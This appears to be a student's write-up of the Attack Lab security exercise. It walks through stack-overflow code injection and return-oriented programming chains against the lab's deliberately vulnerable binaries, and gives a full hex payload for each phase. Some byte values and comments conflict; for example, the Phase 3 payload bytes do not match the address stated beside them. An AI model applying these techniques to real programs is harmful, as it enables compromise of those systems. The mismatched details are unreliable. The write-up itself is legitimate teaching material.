# Attack Lab


| Phase | Program | Level | Method | Function | Points |
| ----- | ------- | ----- | ------ | -------- | ------ |
| 1     | CTARGET | 1     | CI     | touch1   | 10     |
| 2     | CTARGET | 2     | CI     | touch2   | 25     |
| 3     | CTARGET | 3     | CI     | touch3   | 25     |
| 4     | RTARGET | 2     | ROP    | touch2   | 35     |
| 5     | RTARGET | 3     | ROP    | touch3   | 5      |

Questions are in the [Attack Lab PDF](attacklab.pdf)

- [Phase 1](#phase-1)
- [Phase 2](#phase-2)
- [Phase 3](#phase-3)
- [Phase 4](#phase-4)
- [Phase 5](#phase-5)

## Phase 1
Goal: Call touch1()

We start out in the test() function
```
   0x0000000000401968 <+0>:     sub    rsp,0x8
   0x000000000040196c <+4>:     mov    eax,0x0
   0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    edx,eax
   0x0000000000401978 <+16>:    mov    esi,0x403188
   0x000000000040197d <+21>:    mov    edi,0x1
   0x0000000000401982 <+26>:    mov    eax,0x0
   0x0000000000401987 <+31>:    call   0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    rsp,0x8
   0x0000000000401990 <+40>:    ret
```
test() calls getbuf()
```
   0x00000000004017a8 <+0>:     sub    rsp,0x28
   0x00000000004017ac <+4>:     mov    rdi,rsp
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    eax,0x1
   0x00000000004017b9 <+17>:    add    rsp,0x28
   0x00000000004017bd <+21>:    ret
```
getbuf() calls Gets()
```
0x0000000000401a40 <+0>:     push   r12
   0x0000000000401a42 <+2>:     push   rbp
   0x0000000000401a43 <+3>:     push   rbx
   0x0000000000401a44 <+4>:     mov    r12,rdi
   0x0000000000401a47 <+7>:     mov    DWORD PTR [rip+0x2036b3],0x0        # 0x605104 <gets_cnt>
   0x0000000000401a51 <+17>:    mov    rbx,rdi
   0x0000000000401a54 <+20>:    jmp    0x401a67 <Gets+39>
   0x0000000000401a56 <+22>:    lea    rbp,[rbx+0x1]
   0x0000000000401a5a <+26>:    mov    BYTE PTR [rbx],al
   0x0000000000401a5c <+28>:    movzx  edi,al
   0x0000000000401a5f <+31>:    call   0x4019a0 <save_char>
   0x0000000000401a64 <+36>:    mov    rbx,rbp
   0x0000000000401a67 <+39>:    mov    rdi,QWORD PTR [rip+0x202a62]        # 0x6044d0 <infile>
   0x0000000000401a6e <+46>:    call   0x400dc0 <_IO_getc@plt>
   0x0000000000401a73 <+51>:    cmp    eax,0xffffffff
   0x0000000000401a76 <+54>:    je     0x401a7d <Gets+61>
   0x0000000000401a78 <+56>:    cmp    eax,0xa
   0x0000000000401a7b <+59>:    jne    0x401a56 <Gets+22>
   0x0000000000401a7d <+61>:    mov    BYTE PTR [rbx],0x0
   0x0000000000401a80 <+64>:    mov    eax,0x0
   0x0000000000401a85 <+69>:    call   0x4019f8 <save_term>
   0x0000000000401a8a <+74>:    mov    rax,r12
   0x0000000000401a8d <+77>:    pop    rbx
   0x0000000000401a8e <+78>:    pop    rbp
   0x0000000000401a8f <+79>:    pop    r12
   0x0000000000401a91 <+81>:    ret
```

Looking at the getbuf() in C
```
1 unsigned getbuf() 
2 { 
3 char buf[BUFFER_SIZE]; 
4 Gets(buf); 
5 return 1; 
6 }

```
The buffer overflow exist at line 4. 
### Logic
1. GDB disas getbuf shows us the stack frame of the buffer is 40 bytes: `sub rsp, 0x28` 
2. GDB disas touch1 shows the function begins at 0x4017c0
3. Writing 40 bytes in the buffer and over writing the caller return address with touch1's address lands us the solution 
### Solution 
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
c0 17 40                /* address of touch1 */
```
## Phase 2
Cookie 0x59b997fa
Goal: Call touch2(Cookie)

Starting at Test() again
### Logic:
This problem builds on top of phase 1 by requiring us to pass an argument to touch2(), which means we need to somehow execute `mov rdi, parameter` before calling touch2().

First we need to understand how ret works. When ret is executed, it pop the top item off the stack and places it in rip, which grants us control flow if exploited. 

So to solve this problem: 
1. We need to put `mov rdi, argument; ret` instruction in the buffer
2. Redirect rip to the buffer where our instruction lives, and execute instructions
3. after `mov rdi, parameter`, the ret mnemonic will pop another item off the stack and go there
4. We place `touch2`'s address right after the return address so our `ret` lands in `touch2`

We can get the machine code by making a temp.s file
```
.intel_syntax noprefix
mov rdi, 0x59b997fa
ret
```
then compile and Objdump to get machine code
```
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    rdi,0x59b997fa
   7:   c3                      ret
```

We can get the address of touch2() by using GDB disas touch2
```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    rsp,0x8
   0x00000000004017f0 <+4>:     mov    edx,edi
   ...
```

Lastly, we can get the address of the buffer by setting a breaker at getbuf() and inspecting rsp
```
(gdb) i r rsp 
rsp 0x5561dc78
```
### Solution 
```
48 c7 c7 fa 97 b9 59 c3 /* mov rdi, argument; ret */
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* address of buffer that points to our shellcode */
ec 17 40 00 00 00 00 00 /* touch2() */

```

## Phase 3
Cookie 0x59b997fa
Goal: Call touch3(&Cookie)

### Logic: 
Touch3 calls hexmatch which sub 0x80 to the stack, making previous technique of storing our argument in the original buffer obsolete. The solution is to store the string in a save place, below touch3's stack frame. 

First find the stack pointer at the vulnerable buffer
```
(gdb) i r rsp 
rsp 0x5561dca0
```

0x5561dca0 + 0x28 + 0x8 + 0x8 + 0x8 = Where we are storing our string

This will be our payload, we push touch3 and return to it immediately 
```
0000000000000000 <.text>:
   0:   48 c7 c7 c8 dc 61 55    mov    rdi,0x5561dcc8
   7:   68 fa 18 40 00          push   0x4018fa
   c:   c3                      ret
```

* For some reason instead of push touch3, if touch3 is injected by placing the return address after pointer to buffer, the program segfaults. 
## Solution
```
48 c7 c7 b8 dc 61 55 68  /* mov rdi, 0x5561dcc8 */
fa 18 40 00 c3 00 00 00  /* Push touch3; ret */
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* Buf[40] ^ */
78 dc 61 55 00 00 00 00  /* Pointer to buffer */ 
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
35 39 62 39 39 37 66 61 00  /* string at (0x5561dcc8) */ 

```

# Part II: Return-Oriented Programming
 Performing code-injection attacks on program RTARGET is much more difficult than it is for CTARGET
• Uses ASLR 
• Non-executable stack
# Phase 4

Phase 4 want us to repeat the attack of phase 2 but this time using ROP.
Goal: call touch2(cookie)
### Logic:
In the given list of function, we want to search for gadgets that achieves rdi = cookie. 

Looking at these 2 functions we can extract: 
	pop rax; ret
	mov edi, eax; ret

Starting at 0x4019**c6**
89 c7 = mov edi, eax
90 = NOP
c3 = ret 
```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	mov    DWORD PTR [rdi],0x90c78948
  4019c9:	c3                   	ret

```

Starting at 0x4019**ab**
58 = pop rax
90 = NOP
c3 =ret 
```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    eax,[rdi-0x6fa78caf]
  4019ad:	c3                   	ret
```

## Solution 
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* Buf */
ab 19 40 00 00 00 00 00 /* Pop rax; ret */
fa 97 b9 59 00 00 00 00 /* Cookie */
c6 19 40 00 00 00 00 00 /* mov edi, eax; ret */
ec 17 40 00 00 00 00 00 /* touch2() */
```


# Phase 5

Bonus level, hardest difficulty
Goal: call touch3(&cookie)

### Logic: 

The goal is to move the relative address of the string into rdi, so looking at the disassembly, `lea    rax,[rdi+rsi*1] ` seems to be a good starting point. If we can we miniplate the rdi + rsi into rsp + offset, rax would store our string address. Then all we have to do is place rax into rdi. 

Starting at 0x401aad
48 89 e0 = mov rax, rsp
```
0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	mov    DWORD PTR [rdi],0x90e08948
  401ab1:	c3                   	ret
```

Starting at 0x4019a2
48 89 c7 = mov rdi, rax
```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    eax,[rdi-0x3c3876b8]; mov rdi, rcx 
  4019a6:	c3                   	ret       
```

Starting at 0x4019**ab**
58 = pop rax
90 = NOP
```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    eax,[rdi-0x6fa78caf]
  4019ad:	c3                   	ret
```

Starting at 0x4019dd
89 c2 = mov edx, eax
90 = NOP
```
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    eax,0x90c2895c
  4019e0:	c3                   	ret  
```

Starting at 0x401a34
89 d1 = mov ecx, edx
38 c9 = cmp cl, cl (Functional NOP)
```
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    eax,0xc938d189
  401a38:	c3                   	ret
```

Starting at 0x401a13
89 ce = mov esi, ecx 
90 90 = NOP
```
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    eax,[rdi-0x6f6f3177]
  401a17:	c3                   	ret
```

Starting at 0x4019d6
```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    rax,[rdi+rsi*1]
  4019da:	c3                   	ret
```

Starting at 0x4019a2 (again)
48 89 c7 = mov edi, eax
```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    eax,[rdi-0x3c3876b8]; mov rdi, rcx 
  4019a6:	c3                   	ret       
```

# Solution 
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00     /* buf */
ad 1a 40 00 00 00 00 00     /* mov rax, rsp*/
a2 19 40 00 00 00 00 00     /* mov rdi, rax*/
ab 19 40 00 00 00 00 00     /* pop rax*/
50 00 00 00 00 00 00 00     /* offset = 50 */
dd 19 40 00 00 00 00 00     /* mov edx, eax */
34 1a 40 00 00 00 00 00     /* mov ecx, edx */
13 1a 40 00 00 00 00 00     /* mov esi, ecx */
d6 19 40 00 00 00 00 00     /* lea rax, [rdi + rsi *1]*/
a2 19 40 00 00 00 00 00     /* mov rdi, rax */
fa 18 40 00 00 00 00 00     /* touch3() */
00 00 00 00 00 00 00 00     /* Padding */
35 39 62 39 39 37 66 61 00  /* cookie string */

```

[Attack Lab PDF](attacklab.pdf)

